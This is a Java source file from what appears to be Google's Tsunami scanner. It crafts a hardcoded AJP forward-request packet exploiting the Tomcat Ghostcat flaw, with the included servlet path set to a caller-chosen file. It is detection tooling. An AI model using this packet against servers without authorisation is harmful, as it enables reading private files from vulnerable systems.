/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.tomcat.ghostcat.ajp;

import static com.google.tsunami.plugins.detectors.rce.tomcat.ghostcat.ajp.AjpProtocolUtils.encodePacket;
import static com.google.tsunami.plugins.detectors.rce.tomcat.ghostcat.ajp.AjpProtocolUtils.encodeRequestAttributeAttribute;
import static com.google.tsunami.plugins.detectors.rce.tomcat.ghostcat.ajp.AjpProtocolUtils.encodeRequestHeaders;
import static com.google.tsunami.plugins.detectors.rce.tomcat.ghostcat.ajp.AjpProtocolUtils.encodeString;

import com.google.common.collect.ImmutableMap;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

/**
 * A class used to craft an hardcoded AjpForwardRequest packet to exploit the Ghostcat
 * vulnerability. Packet creation follows the AJPv13 AJP Protocol Reference.
 *
 * @see <a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html">Protocol reference</a>
 */
final class GhostcatAjpForwardRequest {
  private static final byte JK_AJP13_FORWARD_REQUEST_PREFIX = 0x02;
  private static final byte GET_METHOD = 0x02;
  private static final byte REQUEST_TERMINATOR = (byte) 0xff;

  private GhostcatAjpForwardRequest() {}

  /**
   * Crafts an hardcoded AjpForwardRequest packet to exploit the Ghostcat vulnerability.
   *
   * @see <a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html">Protocol reference</a>
   */
  static byte[] craft(String host, int port, String reqUri, String path) throws IOException {
    return encodePacket(encodeRequest(host, port, reqUri, path));
  }

  /** Encodes the request packet to be sent in an basic AJP packet. */
  static byte[] encodeRequest(String host, int port, String reqUri, String path)
      throws IOException {
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    try (DataOutputStream packet = new DataOutputStream(byteArrayOutputStream)) {
      packet.write(JK_AJP13_FORWARD_REQUEST_PREFIX); // prefix_code
      packet.write(GET_METHOD); // method
      encodeString(packet, "HTTP/1.1"); // protocol
      encodeString(packet, reqUri); // req_uri
      encodeString(packet, host); // remote_addr
      encodeString(packet, null); // remote_host
      encodeString(packet, host); // server_name
      packet.writeShort(port); // server_port
      packet.writeByte(0); // is_ssl

      // num_headers and request_headers
      encodeRequestHeaders(
          packet,
          ImmutableMap.<String, String>builder()
              .put(
                  "accept",
                  "text/htmlapplication/xhtml+xmlapplication/xml;q=0.9image/webp*/*;q=0.8")
              .put("connection", "keep-alive")
              .put("content-length", "0")
              .put("host", host)
              .put(
                  "user-agent",
                  "Mozilla/5.0 (X11; Linux x86_64; rv,46.0) Gecko/20100101 Firefox/46.0")
              .put("Accept-Encoding", "gzip deflate sdch")
              .put("Accept-Language", "en-USen;q=0.5")
              .put("Upgrade-Insecure-Requests", "1")
              .put("Cache-Control", "max-age=0")
              .build());

      // attributes
      encodeRequestAttributeAttribute(packet, "javax.servlet.include.request_uri", "/");
      encodeRequestAttributeAttribute(packet, "javax.servlet.include.path_info", path);
      encodeRequestAttributeAttribute(packet, "javax.servlet.include.servlet_path", "/");

      packet.writeByte(REQUEST_TERMINATOR); // request_terminator
    }
    return byteArrayOutputStream.toByteArray();
  }
}
